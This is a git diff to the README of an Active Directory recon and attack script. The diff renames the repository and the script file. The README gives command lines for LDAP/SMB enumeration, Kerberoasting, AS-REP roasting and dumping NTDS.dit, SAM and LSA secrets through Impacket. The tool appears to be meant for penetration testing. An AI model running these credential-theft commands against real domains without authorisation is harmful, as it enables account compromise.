@@ -24,8 +24,8 @@ This script provides a comprehensive suite of tools for Active Directory (AD) re
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/yourusername/ad-recon-script.git
-   cd ad-recon-script
+   git clone https://github.com/SQSamir/ad-recon.git
+   cd ad-recon
    ```
 2. Install the dependencies:
    ```bash
@@ -39,7 +39,7 @@ This script provides a comprehensive suite of tools for Active Directory (AD) re
 Run the script with minimal parameters to perform basic AD enumeration using LDAP and SMB (anonymous bind):
 
 ```bash
-python ad_recon.py --server <LDAP_SERVER>
+python ad-recon.py --server <LDAP_SERVER>
 ```
 
 ### Authenticated LDAP and SMB Enumeration
@@ -47,7 +47,7 @@ python ad_recon.py --server <LDAP_SERVER>
 To use authenticated binds, provide username, password, and domain:
 
 ```bash
-python ad_recon.py --server <LDAP_SERVER> --username <USERNAME> --password <PASSWORD> --domain <DOMAIN>
+python ad-recon.py --server <LDAP_SERVER> --username <USERNAME> --password <PASSWORD> --domain <DOMAIN>
 ```
 
 ### Perform Kerberoasting
@@ -55,7 +55,7 @@ python ad_recon.py --server <LDAP_SERVER> --username <USERNAME> --password <PASS
 Run Kerberoasting to extract service tickets for offline cracking:
 
 ```bash
-python ad_recon.py --server <LDAP_SERVER> --username <USERNAME> --password <PASSWORD> --domain <DOMAIN> --kerberoast
+python ad-recon.py --server <LDAP_SERVER> --username <USERNAME> --password <PASSWORD> --domain <DOMAIN> --kerberoast
 ```
 
 ### Perform AS-REP Roasting
@@ -63,7 +63,7 @@ python ad_recon.py --server <LDAP_SERVER> --username <USERNAME> --password <PASS
 Use AS-REP Roasting to target accounts that do not require pre-authentication:
 
 ```bash
-python ad_recon.py --server <LDAP_SERVER> --asrep <USER_FILE>
+python ad-recon.py --server <LDAP_SERVER> --asrep <USER_FILE>
 ```
 
 ### Dump Secrets
@@ -71,7 +71,7 @@ python ad_recon.py --server <LDAP_SERVER> --asrep <USER_FILE>
 Dump NTDS.dit, SAM database, and LSA secrets using Impacket’s `secretsdump.py`:
 
 ```bash
-python ad_recon.py --server <LDAP_SERVER> --username <USERNAME> --password <PASSWORD> --domain <DOMAIN> --dump
+python ad-recon.py --server <LDAP_SERVER> --username <USERNAME> --password <PASSWORD> --domain <DOMAIN> --dump
 ```
 
 ## Options
@@ -89,31 +89,31 @@ python ad_recon.py --server <LDAP_SERVER> --username <USERNAME> --password <PASS
 **Basic Recon (Anonymous Bind):**
 
 ```bash
-python ad_recon.py --server 192.168.1.100
+python ad-recon.py --server 192.168.1.100
 ```
 
 **Authenticated Recon:**
 
 ```bash
-python ad_recon.py --server 192.168.1.100 --username admin --password Passw0rd! --domain example.local
+python ad-recon.py --server 192.168.1.100 --username admin --password Passw0rd! --domain example.local
 ```
 
 **Run Kerberoasting:**
 
 ```bash
-python ad_recon.py --server 192.168.1.100 --username admin --password Passw0rd! --domain example.local --kerberoast
+python ad-recon.py --server 192.168.1.100 --username admin --password Passw0rd! --domain example.local --kerberoast
 ```
 
 **Run AS-REP Roasting:**
 
 ```bash
-python ad_recon.py --server 192.168.1.100 --asrep users.txt
+python ad-recon.py --server 192.168.1.100 --asrep users.txt
 ```
 
 **Dump Secrets:**
 
 ```bash
-python ad_recon.py --server 192.168.1.100 --username admin --password Passw0rd! --domain example.local --dump
+python ad-recon.py --server 192.168.1.100 --username admin --password Passw0rd! --domain example.local --dump
 ```
 
 ## Disclaimer
@@ -134,4 +134,4 @@ This script is inspired by techniques and methods from Juggernaut Sec's [Active 
 
 ---
 
-**Note**: Replace `https://github.com/yourusername/ad-recon-script.git` with your actual GitHub repository link.
+
